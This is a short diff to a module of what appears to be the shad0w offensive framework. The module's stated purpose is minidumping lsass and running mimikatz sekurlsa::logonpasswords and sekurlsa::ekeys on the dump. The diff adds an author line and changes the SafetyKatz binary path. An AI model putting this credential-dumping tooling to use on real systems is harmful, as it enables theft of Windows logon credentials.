@@ -7,12 +7,13 @@ import argparse
 from lib import shellcode
 
 __description__ = "A tool to minidump lsass then use mimikatz sekurlsa::logonpasswords & sekurlsa::ekeys on it"
+__author__ = "@_batsec_, @harmj0y"
 
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
 
 # location of safetykatz binary
-SAFETYKATZ_BIN = "/root/shad0w/bin/SafetyKatz.x86.exe"
+SAFETYKATZ_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/SafetyKatz.exe"
 
 # little hack but lets us pass the args to donut
 class DummyClass(object):
